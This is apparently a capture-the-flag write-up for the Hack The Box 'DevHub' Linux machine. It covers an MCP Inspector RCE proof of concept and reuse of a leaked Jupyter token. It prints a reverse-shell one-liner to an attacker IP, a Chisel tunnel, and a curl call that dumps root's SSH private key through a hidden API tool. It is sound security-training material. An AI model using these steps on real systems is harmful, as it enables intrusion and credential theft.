# DevHub

> **Difficulty:** Medium  
> **Operating System:** Linux
---

## Initial Enumeration

As always, we start with some basic enumeration to identify the open ports, running services, and their versions.

```bash
nmap -p- -v -sV -sC 10.129.245.216
```

![](images/Pasted%20image%2020260703162455.png)

Once the scan finishes, we begin by checking the website to see what the application is about and whether anything interesting stands out.

![](images/Pasted%20image%2020260703163951.png)

We also notice an **MCP Inspector** service running on another port, so let's take a look at that as well.

![](images/Pasted%20image%2020260703164027.png)

And this is where things get interesting.

The MCP Inspector is running version **1.4.2**, which is affected by **CVE-2026-23744**, a vulnerability that can lead to **Remote Code Execution (RCE)**.

This is a promising lead because an RCE vulnerability could allow us to execute commands directly on the target without needing valid credentials.

We search GitHub for a public Proof of Concept (PoC) and find the following exploit:

[https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py)

We use the PoC against our target and successfully obtain a reverse shell.

> [!Note:] Make sure to edit the python script in order for it to be aligned with the Box's machine, IP address, and port number!

```bash
python3 -m http.server

# in another terminal
nc -lvnp 4444
```

![](images/Pasted%20image%2020260703163927.png)

However, we quickly notice that the connection is unstable and closes after a few minutes.

Rather than relying on a shell that might disappear while we're enumerating the machine, we use our initial access to establish another reverse shell.

![](images/Pasted%20image%2020260703165346.png)

With a more stable connection, we can finally start exploring the system.

## Foothold

### Local Enumeration

Now that we're in, let's make our life a little easier by setting up our listener and creating an alias for listing files.

```bash
alias ll='ls -la'
```

The `ll` alias is simply a shortcut for `ls -la`, allowing us to list files, including hidden ones, along with their permissions and ownership information.

![](images/Pasted%20image%2020260706150431.png)

We begin with some common Linux privilege escalation checks, looking for unusual file capabilities and potentially interesting permission configurations.

```bash
getcap -r / 2>/dev/null

find / -perm -0400 2>/dev/null
```

The first command recursively searches for files with Linux capabilities.
These are worth checking because certain capabilities can give an otherwise unprivileged process access to operations normally reserved for root.

The second command searches for files with the owner-read permission bit set. It's worth noting that this is **not specifically an SUID search**; an SUID-focused check would use a different permission mask.

Unfortunately, nothing useful comes out of these checks.

![](images/Pasted%20image%2020260706150933.png)

No worries. We still have other things to enumerate.

### Discovering Internal Services

Next, let's check which ports are listening locally.

```bash
ss -tulpn
```

This command displays listening TCP and UDP sockets and, where permissions allow, the processes associated with them.

This is particularly useful after obtaining a foothold because not every service running on a machine is necessarily exposed to the outside world.
Some applications are deliberately bound to `127.0.0.1`, making them accessible only from the machine itself.

![](images/Pasted%20image%2020260706151110.png)

We notice a couple of interesting local services, so we investigate the processes behind them.

```bash
ps aux | grep 5000
```

And surprisingly, we discover that a **ServerApp authentication token** is exposed in the process information.

![](images/Pasted%20image%2020260706151340.png)

This is a significant finding.

Jupyter Server can use authentication tokens to control access to its web interface. If such a token is exposed through process arguments or other readable information, someone with local access may be able to reuse it to authenticate to the service.

We also notice that the relevant process is running under the **analyst** account.

This gives us a possible route to lateral movement: if we can access the Jupyter environment and execute code there, that code may run with the privileges of the account hosting the Jupyter server.

Before jumping into anything, though, let's query the services and see how they respond.

```bash
curl 127.0.0.1:8888

curl 127.0.0.1:5000
```

![](images/Pasted%20image%2020260706152613.png)

From our testing, we notice two things:

- **Port 5000** requires authentication.
    
- **Port 8888** hosts a JupyterLab instance.
    

Since we already have the Jupyter token, we can try accessing the service with it.

```bash
# use your own displayed token 
curl -L "http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

And in case the above fails:

```bash
curl -L "http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

Here, `-L` tells `curl` to follow HTTP redirects, while the `token` parameter supplies the authentication token used by Jupyter.

The two URLs target slightly different paths: the first requests the JupyterLab interface directly, while the second starts at the server's root endpoint.

The responses expose some useful information and confirm that we're dealing with a Jupyter environment.

![](images/Pasted%20image%2020260706155211.png)

However, interacting with JupyterLab through `curl` isn't particularly convenient. We want access to the actual browser interface so we can explore its features and create notebooks.

And since the service is listening locally on the target, we'll need to forward it to our machine.

### Accessing JupyterLab Through Chisel

For this, we'll use **Chisel**, a tunneling tool that allows us to forward TCP connections over an HTTP-based transport.

The idea is straightforward: establish a tunnel from the compromised machine to our attacking machine, then use that tunnel to access the target's internal Jupyter service.

First, we start the Chisel server on our machine:

```bash
#on our machine
chisel server --reverse -p 8500
```

The `--reverse` option enables reverse port forwarding, while `-p 8500` specifies the port on which our Chisel server will listen.

Next, on the HTB machine, we connect the Chisel client to our server:

```bash
#on HTB's machine
./chisel client 10.10.15.213:8500 R:8888:127.0.0.1:8888
```

Let's break down the forwarding part:

`R:8888:127.0.0.1:8888`

This tells Chisel to expose a port on the server side of the tunnel and forward incoming connections to `127.0.0.1:8888` from the client's perspective.

In our case, that destination is the Jupyter service running on the HTB machine.

So instead of trying to access the target's loopback interface directly, we can now interact with it through our own machine.

With the tunnel established, we open JupyterLab in our browser.

![](images/Pasted%20image%2020260706173829.png)

We authenticate using the token discovered earlier.

And we're in!

### Lateral Movement to Analyst

Now that we have access to JupyterLab, we can explore the notebooks and the environment available to the **analyst** user.

An important thing to understand about Jupyter is that notebooks are not just documents containing Python code. Their cells can be executed by a kernel running on the server.

This means that if we can create a notebook and execute a Python cell, the code runs on the machine hosting Jupyter, under the privileges of the kernel process.

Since this Jupyter instance is associated with **analyst**, we can use it to execute commands in that user's context.

We create a new notebook and run the following Python code to establish a reverse shell:

```bash
import os;
os.system("bash -c 'bash -i >& /dev/tcp/10.10.15.213/4448 0>&1'")

# and open a listener using the same port
nc -lvnp 4448
```

Here, Python's `os.system()` executes a shell command.

The command launches an interactive Bash shell and redirects its input and output through a TCP connection to our attacking machine.

This allows us to interact with the shell remotely rather than having to execute every command through a Jupyter notebook cell.

![](images/Pasted%20image%2020260706174719.png)

And just like that, we've moved from our initial foothold to **analyst**.

Since we now have access as this user, we can retrieve the user flag.

```bash
cd ~

cat user.txt
```

![](images/Pasted%20image%2020260706174825.png)

User owned!

---

## Privilege Escalation

### Investigating the Internal API

Now it's time to figure out how to escalate our privileges to root.

Remember the service running on port **5000** that required authentication?

We haven't forgotten about it.

Earlier, we also came across a `server.py` script associated with the internal service. Now that we have access as **analyst**, we can investigate it more closely.

We start by checking the running processes:

```bash
ps aux | grep analyst
```

![](images/Pasted%20image%2020260706190029.png)

Our investigation points us toward a Python server running with **root privileges**, while its script is accessible to the **analyst** user.

This is worth investigating because a root-owned service can become a privilege escalation path if it exposes dangerous functionality to lower-privileged users.

We navigate to the relevant directory and inspect the script:

```bash
cat /opt/opsmcp/server.py
```

![](images/Pasted%20image%2020260706190247.png)

The first thing that catches our attention is a variable named `**VALID_API_KEY**`.

This appears to contain the authentication key required to interact with the API on port **5000**.

Remember how our earlier requests to that port were rejected because authentication was required?

Well, now we have a possible way around that restriction: rather than bypassing the authentication mechanism, we can authenticate using the key exposed in the script.

But before making any requests, let's understand what the service actually does.

### Understanding the Available Tools

While reading `server.py`, we notice that the application defines several tools.

Some are visible, while others are hidden or intended for administrative use.

These tools are collected in a structure named `**ALL_TOOLS**`.

![](images/Pasted%20image%2020260706190621.png)

This is particularly interesting because the presence of a tool in the server's internal registry doesn't necessarily mean it's exposed through the normal user interface.

A tool might be hidden from ordinary discovery while still being callable through the backend API.

So we continue examining the code to understand how tool execution is handled.

And one tool immediately stands out:

`**_admin_dump**`

The name alone suggests administrative functionality, but we need to inspect its implementation to understand exactly what it can access.

Scrolling further down, we find the request-handling logic.

The service checks the supplied API key and then uses `if`/`elif` conditions to determine which tool should be executed.

One of those conditions handles `**_admin_dump**`.

![](images/Pasted%20image%2020260706191022.png)

This tells us something important: the hidden administrative tool is not merely defined somewhere in the code. It is also reachable through the service's tool-dispatching logic.

The next question is how to call it.

Looking at the API implementation, we can see that the service accepts **POST requests** containing JSON data.

The JSON includes two main fields:

- `name`: identifies the tool we want to execute.
    
- `arguments`: contains the parameters passed to that tool.
    

For the administrative dump functionality, the tool name is `ops._admin_dump`.

![](images/Pasted%20image%2020260706191250.png)

![](images/Pasted%20image%2020260706191435.png)

We also identify the arguments expected by the tool.

The interesting option is a target named `ssh_keys`, along with a confirmation parameter.

This suggests that the tool can return SSH key material when called with the appropriate arguments.

And since the service runs as root, this is potentially a direct route to obtaining privileged credentials.

### Extracting the Root SSH Key

Now that we understand the API's authentication and request format, it's time to put everything together.

We have:

1. The API endpoint running on `127.0.0.1:5000`.
    
2. The API key extracted from `server.py`.
    
3. The hidden tool name, `ops._admin_dump`.
    
4. The arguments required to request SSH keys.
    

We send the following request:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-H "Content-Type: application/json" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
| python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' > /tmp/root.key
```

Let's understand what we're doing here.

First, `curl` sends a POST request to the `/tools/call` endpoint.

The `X-API-Key` header supplies the authentication key discovered in the script, while the `Content-Type: application/json` header tells the server that we're sending JSON data.

Inside the request body, we specify the hidden tool:

`"name":"ops._admin_dump"`

Then we provide its arguments:

`"target":"ssh_keys","confirm":true`

These arguments request the SSH key information and satisfy the confirmation requirement implemented by the tool.

Finally, we pipe the response into a short Python command:

`python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])'`

This parses the JSON response, extracts the value associated with `root_private_key`, and prints it.

The output is redirected into `/tmp/root.key`.

This is useful because we don't need to manually copy the private key out of a potentially larger JSON response. We extract only the field we need and save it directly to a file.

![](images/Pasted%20image%2020260706193918.png)

And it works!

We have successfully retrieved the root SSH private key.

The underlying issue here is not simply that the application uses an API key. The more serious problem is that a lower-privileged user can read the authentication secret and then use it to invoke a sensitive administrative operation exposed by a root-running service.

That combination effectively breaks the privilege boundary between **analyst** and **root**.

### Root Access

With the private key extracted, we transfer it to our attacking machine.

Before using it, we need to make sure the file has the appropriate permissions.

SSH private keys should not be accessible to other users, and the SSH client may reject a key if its permissions are too permissive.

We apply the restrictive permissions:

```bash
chmod 600 
```

The `600` permission mode gives the file owner read and write access while denying access to the group and everyone else.

Once the private key is saved locally as `root.key`, we can use it to authenticate over SSH.

```bash
ssh -i root.key root@devhub.htb
```

The `-i` option tells SSH which private key file to use for authentication.

Assuming the corresponding public key is authorized for the root account, we can authenticate without knowing root's password.

![](images/Pasted%20image%2020260706194014.png)

And we're root!

We retrieve the system flag and complete the machine.

---

## Conclusion

This was a fun machine with a pretty interesting attack path.

The most interesting part for me was the privilege escalation. Having an API key is one thing, but finding a hidden tool in the source code and figuring out how to call it made the final step much more interesting.

I'd give this one a **5/10**.

**— 0xchnk**